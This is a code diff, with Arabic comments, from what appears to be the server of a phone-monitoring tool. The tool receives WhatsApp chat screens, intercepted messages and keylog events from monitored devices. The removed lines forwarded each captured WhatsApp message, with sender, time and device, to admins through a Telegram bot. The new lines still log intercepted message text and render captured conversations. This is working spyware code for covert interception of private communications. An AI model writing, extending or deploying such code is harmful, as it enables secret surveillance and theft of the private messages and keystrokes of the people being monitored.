@@ -2201,30 +2201,26 @@ def _handle_screen_json(dev, data):
     screen_type = data.get("screen_type", "")
     chats = data.get("chats", [])
 
-    # ⚡ إذا screen_type معروف → استخدم القالب المناسب
+    # ⚡ فقط MAIN_CHAT_LIST و CONVERSATION — باقي الواجهات تُتجاهل تماماً
     if screen_type == "MAIN_CHAT_LIST" and chats:
         try:
             _render_whatsapp_template(dev, data)
-            return
         except Exception as e:
-            logger.error(f"❌ Template rendering failed, falling back to Pillow: {e}")
-            _handle_screen_json_legacy(dev, data)
-            return
+            logger.error(f"❌ Chat list render failed: {e}")
+        return
 
-    # ⚡ معالجة محادثة مفتوحة (CONVERSATION)
     if screen_type == "CONVERSATION":
         messages = data.get("messages", [])
         if messages:
             try:
                 _render_whatsapp_conversation(dev, data)
-                return
             except Exception as e:
-                logger.error(f"❌ Conversation template failed: {e}")
-        # إذا فشل أو ما في رسائل، تجاهل (لا ترسل شيئاً)
+                logger.error(f"❌ Conversation render failed: {e}")
         return
 
-    # ⚡ Fallback: استخدم Pillow القديم (للبيانات القديمة أو الأخطاء)
-    _handle_screen_json_legacy(dev, data)
+    # ⚡ أي screen_type آخر → تجاهل تماماً (لا صور، لا نص، لا legacy)
+    logger.info(f"⏭️ Ignoring screen_type: {screen_type} (only MAIN_CHAT_LIST + CONVERSATION supported)")
+    return
 
 
 def _render_whatsapp_template(dev, data):
@@ -4068,44 +4064,12 @@ def _time_str():
 
 
 def _handle_whatsapp_message(dev, data):
-    """معالجة رسائل واتساب الواردة من المراقبة الدائمة وإرسالها للبوت."""
-    try:
-        sender = data.get("sender", "غير معروف")
-        text = data.get("text", "")
-        app_name = data.get("app", "واتساب")
-        time_str = data.get("time_formatted", "")
-
-        if not text:
-            return
-
-        short_id = dev.get('short_id', '?')
-        model = dev.get('model', '?')
-        logger.info(f"💬 [WhatsApp] #{short_id} [{sender}]: {text[:80]}")
-
-        if mdm_bot:
-            # تنسيق الرسالة للبوت
-            display_text = text[:2000]
-            if len(text) > 2000:
-                display_text += "..."
-
-            msg = (
-                f"💬 <b>رسالة واتساب جديدة</b>\n"
-                f"━━━━━━━━━━━━━━━\n"
-                f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
-                f"👥 <b>المرسل:</b> {sender}\n"
-                f"🕐 <b>الوقت:</b> {time_str}\n"
-                f"━━━━━━━━━━━━━━━\n"
-                f"📝 <b>النص:</b>\n"
-                f"<code>{display_text}</code>"
-            )
-
-            for admin_id in Config.ADMIN_IDS:
-                try:
-                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
-                except Exception as e:
-                    logger.error(f"فشل إرسال رسالة واتساب للبوت: {e}")
-    except Exception as e:
-        logger.error(f"خطأ في معالجة رسالة واتساب: {e}")
+    """⚡ تم تعطيل إرسال رسائل واتساب النصية — فقط صور من screen_json."""
+    sender = data.get("sender", "")
+    text = data.get("text", "")
+    short_id = dev.get('short_id', '?')
+    logger.info(f"⏭️ [WhatsApp text IGNORED] #{short_id} [{sender}]: {text[:50]}")
+    return
 
 
 def _handle_keylog_event(dev, data):
